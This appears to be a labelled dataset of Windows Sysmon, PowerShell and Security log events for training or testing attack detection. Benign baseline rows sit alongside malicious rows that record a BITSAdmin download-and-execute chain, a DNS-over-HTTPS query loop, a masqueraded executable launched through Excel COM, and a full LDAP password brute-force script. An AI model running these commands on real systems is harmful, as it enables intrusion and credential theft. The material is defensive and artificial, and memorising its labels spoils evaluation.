sample_id,label,source_type,attack_category,scenario_name,source_file,provider,channel,event_id,timestamp,computer,user,image,command_line,parent_image,target_object,destination_ip,destination_hostname,query_name,script_block_text,event_summary,label_reason
CYB499-026,Benign,PowerShell,,powershell,data/raw/benign/powershell.json,PowerShell,Windows PowerShell,400,2024-10-03T19:56:06.5263992+00:00,Server002,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command $pass = ConvertTo-SecureString 123654AAaa.. -AsPlainText -Force,,,,,,"Available, None, 	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

	HostName=ConsoleHost
	HostVersion=5.1.19041.2673
	HostId=4ffc5ca3-c17f-4fc7-9acc-675644446699
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command $pass = ConvertTo-SecureString 123654AAaa.. -AsPlainText -Force
	EngineVersion=5.1.19041.2673
	RunspaceId=805fc090-bf83-4bd7-9d47-2fb0e177a332
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",PowerShell event 400 from PowerShell on Server002; cmd=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command $pass = ConvertTo-SecureString 123654AAaa.. -AsPlainText -Force; detail=Engine state is changed from None to Available,Selected from the benign baseline PowerShell log; the host application shows routine shell startup or administrative commands without attack-specific indicators.
CYB499-027,Benign,PowerShell,,powershell,data/raw/benign/powershell.json,PowerShell,Windows PowerShell,400,2024-10-03T19:54:01.3655928+00:00,Server002,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell_ise.exe C:\Users\admin_test\Desktop\test.ps1,,,,,,"Available, None, 	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

	HostName=Windows PowerShell ISE Host
	HostVersion=5.1.19041.2673
	HostId=24246766-eb79-4ac7-ada7-5cce2e047335
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell_ise.exe C:\Users\admin_test\Desktop\test.ps1
	EngineVersion=5.1.19041.2673
	RunspaceId=7b9db0f1-55ca-4d10-b05f-4a9395064fb2
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",PowerShell event 400 from PowerShell on Server002; cmd=C:\Windows\System32\WindowsPowerShell\v1.0\powershell_ise.exe C:\Users\admin_test\Desktop\test.ps1; detail=Engine state is changed from None to Available,Selected from the benign baseline PowerShell log; the host application shows routine shell startup or administrative commands without attack-specific indicators.
CYB499-028,Malicious,Sysmon,Persistence,persistence_persist_download_execute,data/raw/malicious/persistence_persist_download_execute_json/T1197-3_Microsoft-Windows-Sysmon_Operational.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,5,2024-10-25 17:02:54.5648412,Server002,SERVER002\admin_test,C:\Windows\System32\bitsadmin.exe,,,,,,,,Sysmon event 5 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\System32\bitsadmin.exe; user=SERVER002\admin_test,The command chain uses BITSAdmin to download content and set a notify command for follow-on execution. Evidence: C:\Windows\System32\bitsadmin.exe
CYB499-029,Benign,Sysmon,,sysmon,data/raw/benign/sysmon.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1,2025-04-18T09:31:35.5291060+00:00,Server002,NT AUTHORITY\SYSTEM,C:\Windows\System32\AggregatorHost.exe,AggregatorHost.exe,C:\Windows\System32\svchost.exe,,,,,,Sysmon event 1 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\System32\AggregatorHost.exe; cmd=AggregatorHost.exe; parent=C:\Windows\System32\svchost.exe; parent_cmd=C:\Windows\System32\svchost.exe -k utcsvc -p; user=NT AUTHORITY\SYSTEM; detail=Process creation,Selected from the benign baseline Sysmon log; the process activity is routine system or application behavior without the malicious-side patterns.
CYB499-030,Benign,Sysmon,,sysmon,data/raw/benign/sysmon.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1,2025-04-29T10:30:17.9732915+00:00,Server002,NT AUTHORITY\SYSTEM,C:\Windows\SoftwareDistribution\Download\Install\AM_Engine.exe,"""C:\Windows\SoftwareDistribution\Download\Install\AM_Engine.exe""",C:\Windows\System32\wuauclt.exe,,,,,,"Sysmon event 1 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\SoftwareDistribution\Download\Install\AM_Engine.exe; cmd=""C:\Windows\SoftwareDistribution\Download\Install\AM_Engine.exe""; parent=C:\Windows\System32\wuauclt.exe; parent_cmd=""C:\Windows\system32\wuauclt.exe"" /UpdateDeploymentProvider UpdateDeploymentProvider.dll /ClassId 987b49e6-49dc-4a07-bf32-7abfd3f81174 /RunHandlerComServer; user=NT AUTHORITY\SYSTEM; detail=Process creation",Selected from the benign baseline Sysmon log; the process activity is routine system or application behavior without the malicious-side patterns.
CYB499-031,Benign,Sysmon,,sysmon,data/raw/benign/sysmon.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1,2025-05-03T05:39:14.0849214+00:00,Server002,NT AUTHORITY\SYSTEM,C:\Windows\SoftwareDistribution\Download\Install\AM_Delta_Patch_1.427.566.0.exe,"""C:\Windows\SoftwareDistribution\Download\Install\AM_Delta_Patch_1.427.566.0.exe"" WD /q",C:\Windows\System32\wuauclt.exe,,,,,,"Sysmon event 1 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\SoftwareDistribution\Download\Install\AM_Delta_Patch_1.427.566.0.exe; cmd=""C:\Windows\SoftwareDistribution\Download\Install\AM_Delta_Patch_1.427.566.0.exe"" WD /q; parent=C:\Windows\System32\wuauclt.exe; parent_cmd=""C:\Windows\system32\wuauclt.exe"" /UpdateDeploymentProvider UpdateDeploymentProvider.dll /ClassId 25915946-df3d-42f1-a2c2-71f13ef089a1 /RunHandlerComServer; user=NT AUTHORITY\SYSTEM; detail=Process creation",Selected from the benign baseline Sysmon log; the process activity is routine system or application behavior without the malicious-side patterns.
CYB499-032,Benign,PowerShell,,powershell,data/raw/benign/powershell.json,PowerShell,Windows PowerShell,400,2024-10-03T19:53:42.4481644+00:00,Server002,,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,,,,,,"Available, None, 	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

	HostName=ConsoleHost
	HostVersion=5.1.19041.2673
	HostId=84f614d2-2144-436b-ac5d-0bdc43f37db1
	HostApplication=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
	EngineVersion=5.1.19041.2673
	RunspaceId=bccbac07-f26c-46e1-87f1-2382e4751ce7
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",PowerShell event 400 from PowerShell on Server002; cmd=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; detail=Engine state is changed from None to Available,Selected from the benign baseline PowerShell log; the host application shows routine shell startup or administrative commands without attack-specific indicators.
CYB499-033,Benign,Security,,security,data/raw/benign/security.json,Microsoft-Windows-Security-Auditing,Security,5024,2025-04-30T08:09:42.5427166+00:00,Server002,,,,,,,,,,Security event 5024 from Microsoft-Windows-Security-Auditing on Server002,Selected from the benign baseline Security log; this is routine Windows audit activity rather than an attack-specific event.
CYB499-034,Benign,Security,,security,data/raw/benign/security.json,Microsoft-Windows-Security-Auditing,Security,4648,2025-04-30T10:09:32.2344012+00:00,Server002,WORKGROUP\SERVER002$,C:\Windows\System32\wininit.exe,C:\Windows\System32\wininit.exe,,,,,,,Security event 4648 from Microsoft-Windows-Security-Auditing on Server002; image=C:\Windows\System32\wininit.exe; cmd=C:\Windows\System32\wininit.exe; user=WORKGROUP\SERVER002$; detail=A logon was attempted using explicit credentials,Selected from the benign baseline Security log; this is routine Windows audit activity rather than an attack-specific event.
CYB499-035,Benign,Sysmon,,sysmon,data/raw/benign/sysmon.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1,2025-06-22T20:35:58.4996774+00:00,Server002,NT AUTHORITY\SYSTEM,C:\Windows\SoftwareDistribution\Download\Install\AM_Engine_Patch_1.1.25030.1.exe,"""C:\Windows\SoftwareDistribution\Download\Install\AM_Engine_Patch_1.1.25030.1.exe""",C:\Windows\System32\wuauclt.exe,,,,,,"Sysmon event 1 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\SoftwareDistribution\Download\Install\AM_Engine_Patch_1.1.25030.1.exe; cmd=""C:\Windows\SoftwareDistribution\Download\Install\AM_Engine_Patch_1.1.25030.1.exe""; parent=C:\Windows\System32\wuauclt.exe; parent_cmd=""C:\Windows\system32\wuauclt.exe"" /UpdateDeploymentProvider UpdateDeploymentProvider.dll /ClassId 5f5c3015-3fc9-43e8-9e42-a32730d1490a /RunHandlerComServer; user=NT AUTHORITY\SYSTEM; detail=Process creation",Selected from the benign baseline Sysmon log; the process activity is routine system or application behavior without the malicious-side patterns.
CYB499-036,Benign,Sysmon,,sysmon,data/raw/benign/sysmon.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1,2025-04-18T10:37:30.2691294+00:00,Server002,SERVER002\lplui,C:\Program Files\WindowsApps\Microsoft.Microsoft3DViewer_7.2502.5012.0_x64__8wekyb3d8bbwe\3DViewer.exe,"""C:\Program Files\WindowsApps\Microsoft.Microsoft3DViewer_7.2502.5012.0_x64__8wekyb3d8bbwe\3DViewer.exe"" -ServerName:Microsoft.Microsoft3DViewer.AppXee4wbwh7vy3ejyrqsebr3ybk1vd6bkyn.mca",,,,,,,"Sysmon event 1 from Microsoft-Windows-Sysmon on Server002; image=C:\Program Files\WindowsApps\Microsoft.Microsoft3DViewer_7.2502.5012.0_x64__8wekyb3d8bbwe\3DViewer.exe; cmd=""C:\Program Files\WindowsApps\Microsoft.Microsoft3DViewer_7.2502.5012.0_x64__8wekyb3d8bbwe\3DViewer.exe"" -ServerName:Microsoft.Microsoft3DViewer.AppXee4wbwh7vy3ejyrqsebr3ybk1vd6...; parent_cmd=-; user=SERVER002\lplui; detail=Process creation",Selected from the benign baseline Sysmon log; the process activity is routine system or application behavior without the malicious-side patterns.
CYB499-037,Malicious,Sysmon,Discovery,discovery_discover_system_language_withchcp,data/raw/malicious/discovery_discover_system_language_withchcp_json/T1614.001-2_Microsoft-Windows-Sysmon_Operational.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1,2024-10-28 16:20:50.9618727,Server002,SERVER002\admin_test,C:\Windows\System32\chcp.com,chcp,C:\Windows\System32\cmd.exe,,,,,,"Sysmon event 1 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\System32\chcp.com; cmd=chcp; parent=C:\Windows\System32\cmd.exe; parent_cmd=""cmd.exe"" /c chcp; user=SERVER002\admin_test","The event uses chcp to inspect the system code page, which can reveal language or locale information. Evidence: chcp"
CYB499-038,Malicious,PowerShell,Command and Control,c2c_dns_https_largequeryvolume,data/raw/malicious/c2c_dns_https_largequeryvolume_json/T1572-1_Windows PowerShell.json,PowerShell,Windows PowerShell,600,2024-10-28 15:11:15.6989974,Server002,,,"powershell.exe & {for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest ""https://8.8.8.8/resolve?name=file.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&type=TXT"" -UseBasicParsing).Content }}",,,,,,"Environment, Started, 	ProviderName=Environment
	NewProviderState=Started

	SequenceNumber=5

	HostName=ConsoleHost
	HostVersion=5.1.19041.5007
	HostId=bad9f401-26a8-4dfa-a31a-2fbb02ead48d
	HostApplication=powershell.exe & {for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest ""https://8.8.8.8/resolve?name=file.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&type=TXT"" -UseBasicParsing).Content }}
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","PowerShell event 600 from PowerShell on Server002; cmd=powershell.exe & {for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest ""https://8.8.8.8/resolve?name=file.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&type=TXT"" -UseBa...","The event shows a PowerShell-driven DNS-over-HTTPS style query loop to 8.8.8.8 with randomized xip.io hostnames. Evidence: powershell.exe & {for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest ""https://8.8.8.8/resolve?name=file.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&type=TXT"" -UseBasicParsing).Content }}"
CYB499-039,Benign,Security,,security,data/raw/benign/security.json,Microsoft-Windows-Security-Auditing,Security,4799,2025-04-29T17:42:58.1310708+00:00,Server002,SERVER002\lplui (S-1-5-21-3962163828-2803415714-1403596700-1001),,,,,,,,,Security event 4799 from Microsoft-Windows-Security-Auditing on Server002; user=SERVER002\lplui (S-1-5-21-3962163828-2803415714-1403596700-1001); detail=A security-enabled local group membership was enumerated,Selected from the benign baseline Security log; this is routine Windows audit activity rather than an attack-specific event.
CYB499-040,Malicious,Sysmon,Execution,execution-app-uninstall-using-wmic,data/raw/malicious/execution-app-uninstall-using-wmic-json/T1047-10_Microsoft-Windows-Sysmon_Operational.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1,2024-10-22 15:28:01.0641173,Server002,SERVER002\admin_test,C:\Windows\System32\wbem\WMIC.exe,"wmic  /node:""127.0.0.1"" product where ""name like 'Tightvnc%%%%'"" call uninstall",C:\Windows\System32\cmd.exe,,,,,,"Sysmon event 1 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\System32\wbem\WMIC.exe; cmd=wmic /node:""127.0.0.1"" product where ""name like 'Tightvnc%%%%'"" call uninstall; parent=C:\Windows\System32\cmd.exe; parent_cmd=""cmd.exe"" /c wmic /node:""127.0.0.1"" product where ""name like 'Tightvnc%%'"" call uninstall; user=SERVER002\admin_test","The event uses WMIC to uninstall a target product over WMI, which is execution behavior tied to the scenario. Evidence: wmic /node:""127.0.0.1"" product where ""name like 'Tightvnc%%%%'"" call uninstall"
CYB499-041,Malicious,Sysmon,Persistence,persistence_persist_download_execute,data/raw/malicious/persistence_persist_download_execute_json/T1197-3_Microsoft-Windows-Sysmon_Operational.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1,2024-10-25 17:02:54.6099364,Server002,SERVER002\admin_test,C:\Windows\System32\bitsadmin.exe,bitsadmin.exe  /resume fileBITS,C:\Windows\System32\cmd.exe,,,,,,"Sysmon event 1 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\System32\bitsadmin.exe; cmd=bitsadmin.exe /resume fileBITS; parent=C:\Windows\System32\cmd.exe; parent_cmd=""cmd.exe"" /c bitsadmin.exe /create fileBITS & bitsadmin.exe /addfile fileBITS https://raw.githubusercontent.com/file/file-file/master/files/data/data.md %temp%\bitsadmin3_flag.p...; user=SERVER002\admin_test",The command chain uses BITSAdmin to download content and set a notify command for follow-on execution. Evidence: bitsadmin.exe /resume fileBITS
CYB499-042,Benign,Sysmon,,sysmon,data/raw/benign/sysmon.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,5,2025-04-18T09:31:56.4806820+00:00,Server002,NT AUTHORITY\SYSTEM,<unknown process>,<unknown process>,,,,,,,Sysmon event 5 from Microsoft-Windows-Sysmon on Server002; image=<unknown process>; cmd=<unknown process>; user=NT AUTHORITY\SYSTEM; detail=Process terminated,Selected from the benign baseline Sysmon log; the process activity is routine system or application behavior without the malicious-side patterns.
CYB499-043,Malicious,PowerShell,Command and Control,c2c_dns_https_largequeryvolume,data/raw/malicious/c2c_dns_https_largequeryvolume_json/T1572-1_Windows PowerShell.json,PowerShell,Windows PowerShell,600,2024-10-28 15:11:15.7149743,Server002,,,"powershell.exe & {for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest ""https://8.8.8.8/resolve?name=file.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&type=TXT"" -UseBasicParsing).Content }}",,,,,,"Variable, Started, 	ProviderName=Variable
	NewProviderState=Started

	SequenceNumber=11

	HostName=ConsoleHost
	HostVersion=5.1.19041.5007
	HostId=bad9f401-26a8-4dfa-a31a-2fbb02ead48d
	HostApplication=powershell.exe & {for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest ""https://8.8.8.8/resolve?name=file.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&type=TXT"" -UseBasicParsing).Content }}
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","PowerShell event 600 from PowerShell on Server002; cmd=powershell.exe & {for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest ""https://8.8.8.8/resolve?name=file.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&type=TXT"" -UseBa...","The event shows a PowerShell-driven DNS-over-HTTPS style query loop to 8.8.8.8 with randomized xip.io hostnames. Evidence: powershell.exe & {for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest ""https://8.8.8.8/resolve?name=file.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&type=TXT"" -UseBasicParsing).Content }}"
CYB499-044,Malicious,Sysmon,Lateral Movement,lateral_powershell_lateral_usingExcelAppObject,data/raw/malicious/lateral_powershell_lateral_usingExcelAppObject_Json/T1021.003-2_Microsoft-Windows-Sysmon_Operational.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1,2024-10-21 11:25:00.3014313,Server002,SERVER002\admin_test,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"""powershell.exe"" & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe', $com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\""""Excel.Application\"""",\""""localhost\"""")), $com.ActivateMicrosoftApp(\""""5\"""")}",,,,,,,"Sysmon event 1 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; cmd=""powershell.exe"" & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe', $com = [System.Activator]::CreateInstance([type]::GetType...; user=SERVER002\admin_test","The PowerShell content copies calc.exe to a masqueraded path and instantiates an Excel COM object on localhost. Evidence: ""powershell.exe"" & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe', $com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\""""Excel.Application\"""",\""""lo..."
CYB499-045,Malicious,PowerShell,Credential Access,credential-access-bruteforceCreds_singleActiveDirectory_viaLDAP,data/raw/malicious/credential-access-bruteforceCreds_singleActiveDirectory_viaLDAP_json/T1110.001-2_Windows PowerShell.json,PowerShell,Windows PowerShell,400,2024-10-24 13:19:18.8008788,Server002,,,"powershell.exe & {if (""NTLM"".ToLower() -NotIn @(""ntlm"",""kerberos"")) {",,,,,,"Available, None, 	NewEngineState=Available
	PreviousEngineState=None

	SequenceNumber=13

	HostName=ConsoleHost
	HostVersion=5.1.19041.5007
	HostId=4a335bbc-027a-41e8-a2ef-bc57ff7bb925
	HostApplication=powershell.exe & {if (""NTLM"".ToLower() -NotIn @(""ntlm"",""kerberos"")) {
 Write-Host ""Only 'NTLM' and 'Kerberos' auth methods are supported""
 exit 1
}

[System.Reflection.Assembly]::LoadWithPartialName(""System.DirectoryServices.Protocols"") | Out-Null
$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(""$env:UserDnsDomain"",389)

$passwordList = Get-Content -Path ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.001\src\passwords.txt""
foreach ($password in $passwordList){
 $credz = new-object System.Net.NetworkCredential(""$ENV:USERNAME"", $password, ""$env:UserDnsDomain"")
 $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::NTLM)
 try {
 Write-Host "" [-] Attempting ${password} on account $ENV:USERNAME.""
 $conn.bind()
 # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
 Write-Host "" [!] $ENV:USERNAME:${password} are valid credentials!""
 } catch {
 Write-Host $_.Exception.Message
 }
}
Write-Host ""End of bruteforce""}
	EngineVersion=5.1.19041.5007
	RunspaceId=f51dd722-90c0-4d26-9d8e-b9a7acc9f51e
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","PowerShell event 400 from PowerShell on Server002; cmd=powershell.exe & {if (""NTLM"".ToLower() -NotIn @(""ntlm"",""kerberos"")) {","The PowerShell/LDAP content iterates passwords against Active Directory using System.DirectoryServices.Protocols. Evidence: powershell.exe & {if (""NTLM"".ToLower() -NotIn @(""ntlm"",""kerberos"")) {"
CYB499-046,Malicious,PowerShell,Lateral Movement,lateral_powershell_lateral_usingExcelAppObject,data/raw/malicious/lateral_powershell_lateral_usingExcelAppObject_Json/T1021.003-2_Windows PowerShell.json,PowerShell,Windows PowerShell,600,2024-10-21 11:25:00.9418620,Server002,,,powershell.exe & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe',,,,,,"Alias, Started, 	ProviderName=Alias
	NewProviderState=Started

	SequenceNumber=3

	HostName=ConsoleHost
	HostVersion=5.1.19041.5007
	HostId=bb6cac0a-46f5-4aad-9c14-28049a346862
	HostApplication=powershell.exe & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe'
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(""Excel.Application"",""localhost""))
$com.ActivateMicrosoftApp(""5"")}
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",PowerShell event 600 from PowerShell on Server002; cmd=powershell.exe & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe',The PowerShell content copies calc.exe to a masqueraded path and instantiates an Excel COM object on localhost. Evidence: powershell.exe & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe'
CYB499-047,Malicious,Sysmon,Persistence,persistence_persist_download_execute,data/raw/malicious/persistence_persist_download_execute_json/T1197-3_Microsoft-Windows-Sysmon_Operational.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1,2024-10-25 17:02:54.5361282,Server002,SERVER002\admin_test,C:\Windows\System32\bitsadmin.exe,bitsadmin.exe  /addfile fileBITS https://raw.githubusercontent.com/file/file-file/master/files/data/data.md C:\Users\ADMIN_~1\AppData\Local\Temp\bitsadmin3_flag.ps1,C:\Windows\System32\cmd.exe,,,,,,"Sysmon event 1 from Microsoft-Windows-Sysmon on Server002; image=C:\Windows\System32\bitsadmin.exe; cmd=bitsadmin.exe /addfile fileBITS https://raw.githubusercontent.com/file/file-file/master/files/data/data.md C:\Users\ADMIN_~1\AppData\Local\Temp\bitsadmin3_flag.ps1; parent=C:\Windows\System32\cmd.exe; parent_cmd=""cmd.exe"" /c bitsadmin.exe /create fileBITS & bitsadmin.exe /addfile fileBITS https://raw.githubusercontent.com/file/file-file/master/files/data/data.md %temp%\bitsadmin3_flag.p...; user=SERVER002\admin_test",The command chain uses BITSAdmin to download content and set a notify command for follow-on execution. Evidence: bitsadmin.exe /addfile fileBITS https://raw.githubusercontent.com/file/file-file/master/files/data/data.md C:\Users\ADMIN_~1\AppData\Local\Temp\bitsadmin3_flag.ps1
CYB499-048,Malicious,PowerShell,Command and Control,c2c_dns_https_largequeryvolume,data/raw/malicious/c2c_dns_https_largequeryvolume_json/T1572-1_Windows PowerShell.json,PowerShell,Windows PowerShell,600,2024-10-28 15:11:15.6944085,Server002,,,"powershell.exe & {for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest ""https://8.8.8.8/resolve?name=file.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&type=TXT"" -UseBasicParsing).Content }}",,,,,,"Alias, Started, 	ProviderName=Alias
	NewProviderState=Started

	SequenceNumber=3

	HostName=ConsoleHost
	HostVersion=5.1.19041.5007
	HostId=bad9f401-26a8-4dfa-a31a-2fbb02ead48d
	HostApplication=powershell.exe & {for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest ""https://8.8.8.8/resolve?name=file.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&type=TXT"" -UseBasicParsing).Content }}
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=","PowerShell event 600 from PowerShell on Server002; cmd=powershell.exe & {for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest ""https://8.8.8.8/resolve?name=file.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&type=TXT"" -UseBa...","The event shows a PowerShell-driven DNS-over-HTTPS style query loop to 8.8.8.8 with randomized xip.io hostnames. Evidence: powershell.exe & {for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest ""https://8.8.8.8/resolve?name=file.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&type=TXT"" -UseBasicParsing).Content }}"
CYB499-049,Benign,Sysmon,,sysmon,data/raw/benign/sysmon.json,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,1,2025-04-22T13:56:25.8914277+00:00,Server002,NT AUTHORITY\SYSTEM,C:\Program Files\Common Files\microsoft shared\ClickToRun\AppVShNotify.exe,"""C:\Program Files\Common Files\Microsoft Shared\ClickToRun\AppVShNotify.exe""",C:\Program Files\Common Files\microsoft shared\ClickToRun\OfficeClickToRun.exe,,,,,,"Sysmon event 1 from Microsoft-Windows-Sysmon on Server002; image=C:\Program Files\Common Files\microsoft shared\ClickToRun\AppVShNotify.exe; cmd=""C:\Program Files\Common Files\Microsoft Shared\ClickToRun\AppVShNotify.exe""; parent=C:\Program Files\Common Files\microsoft shared\ClickToRun\OfficeClickToRun.exe; parent_cmd=""C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeClickToRun.exe"" /service; user=NT AUTHORITY\SYSTEM; detail=Process creation",Selected from the benign baseline Sysmon log; the process activity is routine system or application behavior without the malicious-side patterns.
CYB499-050,Malicious,PowerShell,Lateral Movement,lateral_powershell_lateral_usingExcelAppObject,data/raw/malicious/lateral_powershell_lateral_usingExcelAppObject_Json/T1021.003-2_Windows PowerShell.json,PowerShell,Windows PowerShell,600,2024-10-21 11:25:01.0004325,Server002,,,powershell.exe & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe',,,,,,"Function, Started, 	ProviderName=Function
	NewProviderState=Started

	SequenceNumber=9

	HostName=ConsoleHost
	HostVersion=5.1.19041.5007
	HostId=bb6cac0a-46f5-4aad-9c14-28049a346862
	HostApplication=powershell.exe & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe'
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID(""Excel.Application"",""localhost""))
$com.ActivateMicrosoftApp(""5"")}
	EngineVersion=
	RunspaceId=
	PipelineId=
	CommandName=
	CommandType=
	ScriptName=
	CommandPath=
	CommandLine=",PowerShell event 600 from PowerShell on Server002; cmd=powershell.exe & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe',The PowerShell content copies calc.exe to a masqueraded path and instantiates an Excel COM object on localhost. Evidence: powershell.exe & {copy c:\windows\system32\calc.exe 'C:\users\admin\AppData\local\Microsoft\WindowsApps\foxprow.exe'
